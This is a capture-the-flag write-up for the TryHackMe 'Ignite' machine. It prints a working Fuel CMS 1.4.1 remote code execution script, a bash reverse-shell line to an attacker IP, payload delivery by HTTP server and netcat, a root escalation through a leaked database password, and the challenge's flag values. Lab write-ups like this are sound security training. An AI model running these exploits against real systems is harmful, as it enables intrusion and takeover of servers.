# Ignite

![logo](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/bd001816-10a2-47d1-a383-7be389a99ca8)

## Enumeration

We use `nmap` to scan the target :

```bash
nmap -sT -sV 10.10.128.117
```

![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e5d5b0ce-157d-4e87-adc3-43d5247f578d)


opening the browser on machine IP will show some information :

![firstPage](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/c8c00347-73c8-4ef9-926d-d29fa78eef2b)

with some extra information showing the location of config files :

![configFiles](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/5686dbcd-c9f4-4a27-8951-666f078f27d1)

as it is obvious the username and password for logging in is `admin:admin`

in the CMS itself there is no way to upload a file (at least i tried verious extensions) but none of them worked.

i decided to search for `fuel cms` exploit wtih `searchsploit` :

```bash
searchsploit fuel cms
```

![searchsploit](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e6947bc4-4829-446a-9b3e-11427b29f5da)

it shows that version `1.4.1` has remote code execution vulnerability, so download the exploit `47138.py` from exploit-db.com

![exdb](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/8eb1c17c-2b47-45d9-9b31-21f70afae927)

from the original code you need to change afew things :

![code](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/83f8a4b2-8d98-441c-bf2d-f91eab06ca6f)

```md
1.Change the url to machine IP address
2.Comment out the proxy line
3.Remove the proxies=proxy parameter
```

the final code should be like this :

```python
import requests
import urllib

url = "http://10.10.128.117:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
        xxxx = raw_input('cmd:')
        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
        #proxy = {"http":"http://127.0.0.1:8080"}
        r = requests.get(burp0_url)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = find_nth_overlapping(r.text,begin,2)

        print r.text[0:dup]
```

## Getting Shell

Now execute it with `python2`, it gives you a `cmd` that you can run command with it, for example `ls` :

![cmd](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/38c85ca2-99ba-4550-8d9e-c27429a5a6d3)

you just need to upload your reverse shell to the target so i used bash revshell and saved it to a file call `r.sh` :

```bash
bash -i >& /dev/tcp/10.6.74.10/4444 0>&1
```

use python to make the file downloadable for the target :

```python
python3 -m http.server 8080
```

and get the file from the victim :

![wget](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/2edb533f-3dab-4211-bc39-eaa5971276f1)

after downloading the file on the victim now its time to execute it, first listen on your desired port with `nc` like `nc -nvlp 4444` :

![bash](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/08309f4c-f1bf-494c-ae17-c607353db37e)

navigate to `/home/www-data` and cat the `flag.txt` file, this is your first flag :

```bash
cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

## Privilege Escalation

You can do multiple things here for example uploading `Linpeas.sh` on the target but if you remember from the first page of the site where

it showed multiple configuration files in `fuel/application/config` directory, let's explore this directory to find anything interesting :

![dir](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e3b999aa-57d2-482f-8af1-e9d13a3ac709)

cat the content of `database.php`

![database](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/a2c3f076-3b7f-4195-b1d0-c11800813c11)


yes, the root password is here, we just need to switch to `root` account.

but if we use `su root` we get and error saying `su: must be run from a terminal`

so we first need to escalate the terminal, to do this use the code below :

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
now use `su root` and provide the password.

cat the content of `/root/root.txt` :

```bash
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```

this is the end of Ignite challenge :)
